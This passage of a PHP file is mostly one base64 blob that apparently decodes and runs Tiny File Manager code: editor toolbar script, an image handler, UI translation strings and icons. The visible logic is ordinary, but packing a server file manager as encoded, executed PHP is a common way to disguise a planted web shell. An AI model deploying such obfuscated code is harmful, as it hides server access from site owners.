IiwibWVsIjoiTUVMIiwibWl4YWwiOiJNSVhBTCIsIm11c2hjb2RlIjoiTVVTSENvZGUiLCJteXNxbCI6Ik15U1FMIiwibml4IjoiTml4IiwibnNpcyI6Ik5TSVMiLCJvYmplY3RpdmVjIjoiT2JqZWN0aXZlLUMiLCJvY2FtbCI6Ik9DYW1sIiwicGFzY2FsIjoiUGFzY2FsIiwicGVybCI6IlBlcmwiLCJwZXJsNiI6IlBlcmwgNiIsInBnc3FsIjoicGdTUUwiLCJwaHBfbGFyYXZlbF9ibGFkZSI6IlBIUCAoQmxhZGUgVGVtcGxhdGUpIiwicGhwIjoiUEhQIiwicHVwcGV0IjoiUHVwcGV0IiwicGlnIjoiUGlnIiwicG93ZXJzaGVsbCI6IlBvd2Vyc2hlbGwiLCJwcmFhdCI6IlByYWF0IiwicHJvbG9nIjoiUHJvbG9nIiwicHJvcGVydGllcyI6IlByb3BlcnRpZXMiLCJwcm90b2J1ZiI6IlByb3RvYnVmIiwicHl0aG9uIjoiUHl0aG9uIiwiciI6IlIiLCJyYXpvciI6IlJhem9yIiwicmRvYyI6IlJEb2MiLCJyZWQiOiJSZWQiLCJyaHRtbCI6IlJIVE1MIiwicnN0IjoiUlNUIiwicnVieSI6IlJ1YnkiLCJydXN0IjoiUnVzdCIsInNhc3MiOiJTQVNTIiwic2NhZCI6IlNDQUQiLCJzY2FsYSI6IlNjYWxhIiwic2NoZW1lIjoiU2NoZW1lIiwic2NzcyI6IlNDU1MiLCJzaCI6IlNIIiwic2pzIjoiU0pTIiwic2xpbSI6IlNsaW0iLCJzbWFydHkiOiJTbWFydHkiLCJzbmlwcGV0cyI6InNuaXBwZXRzIiwic295X3RlbXBsYXRlIjoiU295IFRlbXBsYXRlIiwic3BhY2UiOiJTcGFjZSIsInNxbCI6IlNRTCIsInNxbHNlcnZlciI6IlNRTFNlcnZlciIsInN0eWx1cyI6IlN0eWx1cyIsInN2ZyI6IlNWRyIsInN3aWZ0IjoiU3dpZnQiLCJ0Y2wiOiJUY2wiLCJ0ZXJyYWZvcm0iOiJUZXJyYWZvcm0iLCJ0ZXgiOiJUZXgiLCJ0ZXh0IjoiVGV4dCIsInRleHRpbGUiOiJUZXh0aWxlIiwidG9tbCI6IlRvbWwiLCJ0c3giOiJUU1giLCJ0d2lnIjoiVHdpZyIsInR5cGVzY3JpcHQiOiJUeXBlc2NyaXB0IiwidmFsYSI6IlZhbGEiLCJ2YnNjcmlwdCI6IlZCU2NyaXB0IiwidmVsb2NpdHkiOiJWZWxvY2l0eSIsInZlcmlsb2ciOiJWZXJpbG9nIiwidmhkbCI6IlZIREwiLCJ2aXN1YWxmb3JjZSI6IlZpc3VhbGZvcmNlIiwid29sbG9rIjoiV29sbG9rIiwieG1sIjoiWE1MIiwieHF1ZXJ5IjoiWFF1ZXJ5IiwieWFtbCI6IllBTUwiLCJkamFuZ28iOiJEamFuZ28ifSwiZm9udFNpemUiOns4OjgsMTA6MTAsMTE6MTEsMTI6MTIsMTM6MTMsMTQ6MTQsMTU6MTUsMTY6MTYsMTc6MTcsMTg6MTgsMjA6MjAsMjI6MjIsMjQ6MjQsMjY6MjYsMzA6MzB9fTsKICAgICAgICAgICAgaWYoX2RhdGEgJiYgX2RhdGEuYWNlTW9kZSkgeyAkbW9kZUVsLmh0bWwob3B0aW9uTm9kZSgiYWNlL21vZGUvIiwgX2RhdGEuYWNlTW9kZSkpOyB9CiAgICAgICAgICAgIGlmKF9kYXRhICYmIF9kYXRhLmFjZVRoZW1lKSB7IHZhciBsaWdodFRoZW1lID0gb3B0aW9uTm9kZSgiYWNlL3RoZW1lLyIsIF9kYXRhLmFjZVRoZW1lLmJyaWdodCksIGRhcmtUaGVtZSA9IG9wdGlvbk5vZGUoImFjZS90aGVtZS8iLCBfZGF0YS5hY2VUaGVtZS5kYXJrKTsgJHRoZW1lRWwuaHRtbCgiPG9wdGdyb3VwIGxhYmVsPVwiQnJpZ2h0XCI+IitsaWdodFRoZW1lKyI8L29wdGdyb3VwPjxvcHRncm91cCBsYWJlbD1cIkRhcmtcIj4iK2RhcmtUaGVtZSsiPC9vcHRncm91cD4iKTt9CiAgICAgICAgICAgIGlmKF9kYXRhICYmIF9kYXRhLmZvbnRTaXplKSB7ICRmb250U2l6ZUVsLmh0bWwob3B0aW9uTm9kZSgiIiwgX2RhdGEuZm9udFNpemUpKTsgfQogICAgICAgICAgICAkbW9kZUVsLnZhbCggZWRpdG9yLmdldFNlc3Npb24oKS4kbW9kZUlkICk7CiAgICAgICAgICAgICR0aGVtZUVsLnZhbCggZWRpdG9yLmdldFRoZW1lKCkgKTsKICAgICAgICAgICAgJGZvbnRTaXplRWwudmFsKDEyKS5jaGFuZ2UoKTsgLy9zZXQgZGVmYXVsdCBmb250IHNpemUgaW4gZHJvcCBkb3duCiAgICAgICAgfQoKICAgICAgICAkKGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIHJlbmRlclRoZW1lTW9kZSgpOwogICAgICAgICAgICAkKCIuanMtYWNlLXRvb2xiYXIiKS5vbigiY2xpY2siLCAnYnV0dG9uJywgZnVuY3Rpb24oZSl7CiAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICBsZXQgY21kVmFsdWUgPSAkKHRoaXMpLmF0dHIoImRhdGEtY21kIiksIGVkaXRvck9wdGlvbiA9ICQodGhpcykuYXR0cigiZGF0YS1vcHRpb24iKTsKICAgICAgICAgICAgICAgIGlmKGNtZFZhbHVlICYmIGNtZFZhbHVlICE9ICJub25lIikgewogICAgICAgICAgICAgICAgICAgIGFjZV9jb21tZW5kKGNtZFZhbHVlKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZihlZGl0b3JPcHRpb24pIHsKICAgICAgICAgICAgICAgICAgICBpZihlZGl0b3JPcHRpb24gPT0gImZ1bGxzY3JlZW4iKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICh2b2lkIDAhPT1kb2N1bWVudC5mdWxsU2NyZWVuRWxlbWVudCYmbnVsbD09PWRvY3VtZW50LmZ1bGxTY3JlZW5FbGVtZW50fHx2b2lkIDAhPT1kb2N1bWVudC5tc0Z1bGxzY3JlZW5FbGVtZW50JiZudWxsPT09ZG9jdW1lbnQubXNGdWxsc2NyZWVuRWxlbWVudHx8dm9pZCAwIT09ZG9jdW1lbnQubW96RnVsbFNjcmVlbiYmIWRvY3VtZW50Lm1vekZ1bGxTY3JlZW58fHZvaWQgMCE9PWRvY3VtZW50LndlYmtpdElzRnVsbFNjcmVlbiYmIWRvY3VtZW50LndlYmtpdElzRnVsbFNjcmVlbikKICAgICAgICAgICAgICAgICAgICAgICAgJiYoZWRpdG9yLmNvbnRhaW5lci5yZXF1ZXN0RnVsbFNjcmVlbj9lZGl0b3IuY29udGFpbmVyLnJlcXVlc3RGdWxsU2NyZWVuKCk6ZWRpdG9yLmNvbnRhaW5lci5tb3pSZXF1ZXN0RnVsbFNjcmVlbj9lZGl0b3IuY29udGFpbmVyLm1velJlcXVlc3RGdWxsU2NyZWVuKCk6ZWRpdG9yLmNvbnRhaW5lci53ZWJraXRSZXF1ZXN0RnVsbFNjcmVlbj9lZGl0b3IuY29udGFpbmVyLndlYmtpdFJlcXVlc3RGdWxsU2NyZWVuKEVsZW1lbnQuQUxMT1dfS0VZQk9BUkRfSU5QVVQpOmVkaXRvci5jb250YWluZXIubXNSZXF1ZXN0RnVsbHNjcmVlbiYmZWRpdG9yLmNvbnRhaW5lci5tc1JlcXVlc3RGdWxsc2NyZWVuKCkpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihlZGl0b3JPcHRpb24gPT0gIndyYXAiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB3cmFwU3RhdHVzID0gKGVkaXRvci5nZXRTZXNzaW9uKCkuZ2V0VXNlV3JhcE1vZGUoKSkgPyBmYWxzZSA6IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0VXNlV3JhcE1vZGUod3JhcFN0YXR1cyk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmKGVkaXRvck9wdGlvbiA9PSAiaGVscCIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGhlbHBIdG1sPSIiOyQuZWFjaCh3aW5kb3cuY29uZmlnLmFjZUhlbHAsZnVuY3Rpb24oaSx2YWx1ZSl7aGVscEh0bWwrPSI8bGk+Iit2YWx1ZSsiPC9saT4iO30pO3ZhciB0cGxPYmo9e2lkOjEwMjgsdGl0bGU6IkhlbHAiLGFjdGlvbjpmYWxzZSxjb250ZW50OmhlbHBIdG1sfSx0cGw9JCgiI2pzLXRwbC1tb2RhbCIpLmh0bWwoKTskKCcjd3JhcHBlcicpLmFwcGVuZCh0ZW1wbGF0ZSh0cGwsdHBsT2JqKSk7JCgiI2pzLU1vZGFsQ2VudGVyLTEwMjgiKS5tb2RhbCgnc2hvdycpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICQoInNlbGVjdCNqcy1hY2UtbW9kZSwgc2VsZWN0I2pzLWFjZS10aGVtZSwgc2VsZWN0I2pzLWFjZS1mb250U2l6ZSIpLm9uKCJjaGFuZ2UiLCBmdW5jdGlvbihlKXsKICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgIGxldCBzZWxlY3RlZFZhbHVlID0gJCh0aGlzKS52YWwoKSwgc2VsZWN0aW9uVHlwZSA9ICQodGhpcykuYXR0cigiZGF0YS10eXBlIik7CiAgICAgICAgICAgICAgICBpZihzZWxlY3RlZFZhbHVlICYmIHNlbGVjdGlvblR5cGUgPT0gIm1vZGUiKSB7CiAgICAgICAgICAgICAgICAgICAgZWRpdG9yLmdldFNlc3Npb24oKS5zZXRNb2RlKHNlbGVjdGVkVmFsdWUpOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmKHNlbGVjdGVkVmFsdWUgJiYgc2VsZWN0aW9uVHlwZSA9PSAidGhlbWUiKSB7CiAgICAgICAgICAgICAgICAgICAgZWRpdG9yLnNldFRoZW1lKHNlbGVjdGVkVmFsdWUpOwogICAgICAgICAgICAgICAgfWVsc2UgaWYoc2VsZWN0ZWRWYWx1ZSAmJiBzZWxlY3Rpb25UeXBlID09ICJmb250U2l6ZSIpIHsKICAgICAgICAgICAgICAgICAgICBlZGl0b3Iuc2V0Rm9udFNpemUocGFyc2VJbnQoc2VsZWN0ZWRWYWx1ZSkpOyAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICA8L3NjcmlwdD4KPD9waHAgZW5kaWY7ID8+CjxkaXYgaWQ9InNuYWNrYmFyIj48L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cjw/cGhwCn0KCi8qKgogKiBTaG93IGltYWdlCiAqIEBwYXJhbSBzdHJpbmcgJGltZwogKi8KZnVuY3Rpb24gZm1fc2hvd19pbWFnZSgkaW1nKQp7CiAgICAkbW9kaWZpZWRfdGltZSA9IGdtZGF0ZSgnRCwgZCBNIFkgMDA6MDA6MDAnKSAuICcgR01UJzsKICAgICRleHBpcmVzX3RpbWUgPSBnbWRhdGUoJ0QsIGQgTSBZIDAwOjAwOjAwJywgc3RydG90aW1lKCcrMSBkYXknKSkgLiAnIEdNVCc7CgogICAgJGltZyA9IHRyaW0oJGltZyk7CiAgICAkaW1hZ2VzID0gZm1fZ2V0X2ltYWdlcygpOwogICAgJGltYWdlID0gJ2lWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFCQ0FZQUFBQWZGY1NKQUFBQUVFbEVRVlI0Mm1MNC8vOC9BMENBQVFBSS9BTCsyNkpORmdBQUFBQkpSVTVFcmtKZ2dnPT0nOwogICAgaWYgKGlzc2V0KCRpbWFnZXNbJGltZ10pKSB7CiAgICAgICAgJGltYWdlID0gJGltYWdlc1skaW1nXTsKICAgIH0KICAgICRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpKSB7CiAgICAgICAgJHNpemUgPSBtYl9zdHJsZW4oJGltYWdlLCAnOGJpdCcpOwogICAgfSBlbHNlIHsKICAgICAgICAkc2l6ZSA9IHN0cmxlbigkaW1hZ2UpOwogICAgfQoKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2hlYWRlcl9yZW1vdmUnKSkgewogICAgICAgIGhlYWRlcl9yZW1vdmUoJ0NhY2hlLUNvbnRyb2wnKTsKICAgICAgICBoZWFkZXJfcmVtb3ZlKCdQcmFnbWEnKTsKICAgIH0gZWxzZSB7CiAgICAgICAgaGVhZGVyKCdDYWNoZS1Db250cm9sOicpOwogICAgICAgIGhlYWRlcignUHJhZ21hOicpOwogICAgfQoKICAgIGhlYWRlcignTGFzdC1Nb2RpZmllZDogJyAuICRtb2RpZmllZF90aW1lLCB0cnVlLCAyMDApOwogICAgaGVhZGVyKCdFeHBpcmVzOiAnIC4gJGV4cGlyZXNfdGltZSk7CiAgICBoZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gJHNpemUpOwogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IGltYWdlL3BuZycpOwogICAgZWNobyAkaW1hZ2U7CgogICAgZXhpdDsKfQoKCi8qKgogKiBMYW5ndWFnZSBUcmFuc2xhdGlvbiBTeXN0ZW0KICogQHBhcmFtIHN0cmluZyAkdHh0CiAqIEByZXR1cm4gc3RyaW5nCiAqLwpmdW5jdGlvbiBsbmcoJHR4dCkgewogICAgZ2xvYmFsICRsYW5nOwoKICAgIC8vIEVuZ2xpc2ggTGFuZ3VhZ2UKICAgICR0clsnZW4nXVsnQXBwTmFtZSddICAgICAgICA9ICdUaW55IEZpbGUgTWFuYWdlcic7ICAgICAgJHRyWydlbiddWydBcHBUaXRsZSddICAgICAgICAgICA9ICdGaWxlIE1hbmFnZXInOwogICAgJHRyWydlbiddWydMb2dpbiddICAgICAgICAgID0gJ1NpZ24gaW4nOyAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ1VzZXJuYW1lJ10gICAgICAgICAgID0gJ1VzZXJuYW1lJzsKICAgICR0clsnZW4nXVsnUGFzc3dvcmQnXSAgICAgICA9ICdQYXNzd29yZCc7ICAgICAgICAgICAgICAgJHRyWydlbiddWydMb2dvdXQnXSAgICAgICAgICAgICA9ICdTaWduIE91dCc7CiAgICAkdHJbJ2VuJ11bJ01vdmUnXSAgICAgICAgICAgPSAnTW92ZSc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnQ29weSddICAgICAgICAgICAgICAgPSAnQ29weSc7CiAgICAkdHJbJ2VuJ11bJ1NhdmUnXSAgICAgICAgICAgPSAnU2F2ZSc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnU2VsZWN0QWxsJ10gICAgICAgICAgPSAnU2VsZWN0IGFsbCc7CiAgICAkdHJbJ2VuJ11bJ1VuU2VsZWN0QWxsJ10gICAgPSAnVW5zZWxlY3QgYWxsJzsgICAgICAgICAgICR0clsnZW4nXVsnRmlsZSddICAgICAgICAgICAgICAgPSAnRmlsZSc7CiAgICAkdHJbJ2VuJ11bJ0JhY2snXSAgICAgICAgICAgPSAnQmFjayc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnU2l6ZSddICAgICAgICAgICAgICAgPSAnU2l6ZSc7CiAgICAkdHJbJ2VuJ11bJ1Blcm1zJ10gICAgICAgICAgPSAnUGVybXMnOyAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnTW9kaWZpZWQnXSAgICAgICAgICAgPSAnTW9kaWZpZWQnOwogICAgJHRyWydlbiddWydPd25lciddICAgICAgICAgID0gJ093bmVyJzsgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ1NlYXJjaCddICAgICAgICAgICAgID0gJ1NlYXJjaCc7CiAgICAkdHJbJ2VuJ11bJ05ld0l0ZW0nXSAgICAgICAgPSAnTmV3IEl0ZW0nOyAgICAgICAgICAgICAgICR0clsnZW4nXVsnRm9sZGVyJ10gICAgICAgICAgICAgPSAnRm9sZGVyJzsKICAgICR0clsnZW4nXVsnRGVsZXRlJ10gICAgICAgICA9ICdEZWxldGUnOyAgICAgICAgICAgICAgICAgJHRyWydlbiddWydSZW5hbWUnXSAgICAgICAgICAgICA9ICdSZW5hbWUnOwogICAgJHRyWydlbiddWydDb3B5VG8nXSAgICAgICAgID0gJ0NvcHkgdG8nOyAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0RpcmVjdExpbmsnXSAgICAgICAgID0gJ0RpcmVjdCBsaW5rJzsKICAgICR0clsnZW4nXVsnVXBsb2FkaW5nRmlsZXMnXSA9ICdVcGxvYWQgRmlsZXMnOyAgICAgICAgICAgJHRyWydlbiddWydDaGFuZ2VQZXJtaXNzaW9ucyddICA9ICdDaGFuZ2UgUGVybWlzc2lvbnMnOwogICAgJHRyWydlbiddWydDb3B5aW5nJ10gICAgICAgID0gJ0NvcHlpbmcnOyAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0NyZWF0ZU5ld0l0ZW0nXSAgICAgID0gJ0NyZWF0ZSBOZXcgSXRlbSc7CiAgICAkdHJbJ2VuJ11bJ05hbWUnXSAgICAgICAgICAgPSAnTmFtZSc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnQWR2YW5jZWRFZGl0b3InXSAgICAgPSAnQWR2YW5jZWQgRWRpdG9yJzsKICAgICR0clsnZW4nXVsnUmVtZW1iZXJNZSddICAgICA9ICdSZW1lbWJlciBNZSc7ICAgICAgICAgICAgJHRyWydlbiddWydBY3Rpb25zJ10gICAgICAgICAgICA9ICdBY3Rpb25zJzsKICAgICR0clsnZW4nXVsnVXBsb2FkJ10gICAgICAgICA9ICdVcGxvYWQnOyAgICAgICAgICAgICAgICAgJHRyWydlbiddWydDYW5jZWwnXSAgICAgICAgICAgICA9ICdDYW5jZWwnOwogICAgJHRyWydlbiddWydJbnZlcnRTZWxlY3Rpb24nXT0gJ0ludmVydCBTZWxlY3Rpb24nOyAgICAgICAkdHJbJ2VuJ11bJ0Rlc3RpbmF0aW9uRm9sZGVyJ10gID0gJ0Rlc3RpbmF0aW9uIEZvbGRlcic7CiAgICAkdHJbJ2VuJ11bJ0l0ZW1UeXBlJ10gICAgICAgPSAnSXRlbSBUeXBlJzsgICAgICAgICAgICAgICR0clsnZW4nXVsnSXRlbU5hbWUnXSAgICAgICAgICAgPSAnSXRlbSBOYW1lJzsKICAgICR0clsnZW4nXVsnQ3JlYXRlTm93J10gICAgICA9ICdDcmVhdGUgTm93JzsgICAgICAgICAgICAgJHRyWydlbiddWydEb3dubG9hZCddICAgICAgICAgICA9ICdEb3dubG9hZCc7CiAgICAkdHJbJ2VuJ11bJ09wZW4nXSAgICAgICAgICAgPSAnT3Blbic7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnVW5aaXAnXSAgICAgICAgICAgICAgPSAnVW5aaXAnOwogICAgJHRyWydlbiddWydVblppcFRvRm9sZGVyJ10gID0gJ1VuWmlwIHRvIGZvbGRlcic7ICAgICAgICAkdHJbJ2VuJ11bJ0VkaXQnXSAgICAgICAgICAgICAgID0gJ0VkaXQnOwogICAgJHRyWydlbiddWydOb3JtYWxFZGl0b3InXSAgID0gJ05vcm1hbCBFZGl0b3InOyAgICAgICAgICAkdHJbJ2VuJ11bJ0JhY2tVcCddICAgICAgICAgICAgID0gJ0JhY2sgVXAnOwogICAgJHRyWydlbiddWydTb3VyY2VGb2xkZXInXSAgID0gJ1NvdXJjZSBGb2xkZXInOyAgICAgICAgICAkdHJbJ2VuJ11bJ0ZpbGVzJ10gICAgICAgICAgICAgID0gJ0ZpbGVzJzsKICAgICR0clsnZW4nXVsnTW92ZSddICAgICAgICAgICA9ICdNb3ZlJzsgICAgICAgICAgICAgICAgICAgJHRyWydlbiddWydDaGFuZ2UnXSAgICAgICAgICAgICA9ICdDaGFuZ2UnOwogICAgJHRyWydlbiddWydTZXR0aW5ncyddICAgICAgID0gJ1NldHRpbmdzJzsgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0xhbmd1YWdlJ10gICAgICAgICAgID0gJ0xhbmd1YWdlJzsKICAgICR0clsnZW4nXVsnTWVtb3J5VXNlZCddICAgICA9ICdNZW1vcnkgdXNlZCc7ICAgICAgICAgICAgJHRyWydlbiddWydQYXJ0aXRpb25TaXplJ10gICAgICA9ICdQYXJ0aXRpb24gc2l6ZSc7CiAgICAkdHJbJ2VuJ11bJ0Vycm9yUmVwb3J0aW5nJ10gPSAnRXJyb3IgUmVwb3J0aW5nJzsgICAgICAgICR0clsnZW4nXVsnU2hvd0hpZGRlbkZpbGVzJ10gICAgPSAnU2hvdyBIaWRkZW4gRmlsZXMnOwogICAgJHRyWydlbiddWydGdWxsIHNpemUnXSAgICAgID0gJ0Z1bGwgc2l6ZSc7ICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0hlbHAnXSAgICAgICAgICAgICAgID0gJ0hlbHAnOwogICAgJHRyWydlbiddWydGcmVlIG9mJ10gICAgICAgID0gJ0ZyZWUgb2YnOyAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ1ByZXZpZXcnXSAgICAgICAgICAgID0gJ1ByZXZpZXcnOwogICAgJHRyWydlbiddWydIZWxwIERvY3VtZW50cyddID0gJ0hlbHAgRG9jdW1lbnRzJzsgICAgICAgICAkdHJbJ2VuJ11bJ1JlcG9ydCBJc3N1ZSddICAgICAgID0gJ1JlcG9ydCBJc3N1ZSc7CiAgICAkdHJbJ2VuJ11bJ0dlbmVyYXRlJ10gICAgICAgPSAnR2VuZXJhdGUnOyAgICAgICAgICAgICAgICR0clsnZW4nXVsnRnVsbFNpemUnXSAgICAgICAgICAgPSAnRnVsbCBTaXplJzsKICAgICR0clsnZW4nXVsnRnJlZU9mJ10gICAgICAgICA9ICdmcmVlIG9mJzsgICAgICAgICAgICAgICAgJHRyWydlbiddWydDYWxjdWxhdGVGb2xkZXJTaXplJ109ICdDYWxjdWxhdGUgZm9sZGVyIHNpemUnOwogICAgJHRyWydlbiddWydQcm9jZXNzSUQnXSAgICAgID0gJ1Byb2Nlc3MgSUQnOyAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0NyZWF0ZWQnXSAgICA9ICdDcmVhdGVkJzsKICAgICR0clsnZW4nXVsnSGlkZUNvbHVtbnMnXSAgICA9ICdIaWRlIFBlcm1zL093bmVyIGNvbHVtbnMnOyR0clsnZW4nXVsnRm9sZGVyIGlzIGVtcHR5J10gICAgPSAnRm9sZGVyIGlzIGVtcHR5JzsKICAgICR0clsnZW4nXVsnQ2hlY2sgTGF0ZXN0IFZlcnNpb24nXSA9ICdDaGVjayBMYXRlc3QgVmVyc2lvbic7JHRyWydlbiddWydHZW5lcmF0ZSBuZXcgcGFzc3dvcmQgaGFzaCddID0gJ0dlbmVyYXRlIG5ldyBwYXNzd29yZCBoYXNoJzsKICAgICR0clsnZW4nXVsnWW91IGFyZSBsb2dnZWQgaW4nXSAgICA9ICdZb3UgYXJlIGxvZ2dlZCBpbic7ICR0clsnZW4nXVsnTG9naW4gZmFpbGVkLiBJbnZhbGlkIHVzZXJuYW1lIG9yIHBhc3N3b3JkJ10gPSAnTG9naW4gZmFpbGVkLiBJbnZhbGlkIHVzZXJuYW1lIG9yIHBhc3N3b3JkJzsKICAgICR0clsnZW4nXVsncGFzc3dvcmRfaGFzaCBub3Qgc3VwcG9ydGVkLCBVcGdyYWRlIFBIUCB2ZXJzaW9uJ10gPSAncGFzc3dvcmRfaGFzaCBub3Qgc3VwcG9ydGVkLCBVcGdyYWRlIFBIUCB2ZXJzaW9uJzsKICAgIAogICAgJGkxOG4gPSBmbV9nZXRfdHJhbnNsYXRpb25zKCR0cik7CiAgICAkdHIgPSAkaTE4biA/ICRpMThuIDogJHRyOwoKICAgIGlmICghc3RybGVuKCRsYW5nKSkgJGxhbmcgPSAnZW4nOwogICAgaWYgKGlzc2V0KCR0clskbGFuZ11bJHR4dF0pKSByZXR1cm4gZm1fZW5jKCR0clskbGFuZ11bJHR4dF0pOwogICAgZWxzZSBpZiAoaXNzZXQoJHRyWydlbiddWyR0eHRdKSkgcmV0dXJuIGZtX2VuYygkdHJbJ2VuJ11bJHR4dF0pOwogICAgZWxzZSByZXR1cm4gIiR0eHQiOwp9CgovKioKICogR2V0IGJhc2U2NC1lbmNvZGVkIGltYWdlcwogKiBAcmV0dXJuIGFycmF5CiAqLwpmdW5jdGlvbiBmbV9nZXRfaW1hZ2VzKCkKewogICAgcmV0dXJuIGFycmF5KAogICAgICAgICdmYXZpY29uJyA9PiAnUWswNEFnQUFBQUFBQURZQUFBQW9BQUFBRUFBQUFCQUFBQUFCQUJBQUFBQUFBQUlDQUFBU0N3QUFFZ3NBQUFBQUFBQUFBQUFBSVFRaEJDRUVJUVFoQkNFRUlRUWhCQ0VFSVEKICAgICAgICBRaEJDRUVJUVFoQkNFRUlRUWhCQ0VFSVFRaEJITk8zbi9lZjk1L3ZYZXROU0VFSVFRaEJDRUVJUVFoQkNFRUlRUWhCQ0VFYzA3ZWY5NS8zbi9lZjk1LzFsb2hCQ0VFSVFRaEJDRUVJUVFoQkNFRUlRCiAgICAgICAgUnpUdDUvM244aEJERkczbi9lZnlFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQkhOTzNuL2VmeUVFTVViZWY5NS9JUVFoQkNFRUlRUWhCQ0VFSVFRaEJDRUVyVFZ6VG5OT0lRUXhSdDUvM244aEJDRUVJUQogICAgICAgIFFoQkNFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQkRGRzNuL2VmeUVFSVFRaEJDRUVJUVFoQkNFRUlRUWhCQ0VFSVFReFJ0NS8zbitjYzJzdElRUWhCQ0VFSVFRaEJDRUVJUVFoQkNFRUlRUUlJWnh6M24KICAgICAgICAvZWY1eHpheTBoQkNFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQkNFRUlRUWhCREZHM24vZWZ5RUVJUVFoQkNFRUlRUWhCQ0VFSVFRaEJLMDFjMDV6VGlFRU1VYmVmOTUvSVFRaEJDRUVJUVFoQkNFRUlRCiAgICAgICAgUWhCQ0VFYzA3ZWY5NS9JUVF4UnQ1LzNuOGhCQ0VFSVFRaEJDRUVJUVFoQkNFRUlRUnpUdDUvM244aEJERkczbi9lZnlFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQktVVU9XZmVmOTUvM24vZWY5NS9JUQogICAgICAgIFFoQkNFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQkpSVzNuL2VmOTUvM244aEJDRUVJUVFoQkNFRUlRUWhCQ0VFSVFRaEJDRUVJUVFoQkNFRUlRUWhCQ0VFSVFRaEJDRUVJUVFBQUE9PScKICAgICk7Cn0KCj8+Cg=="));
?>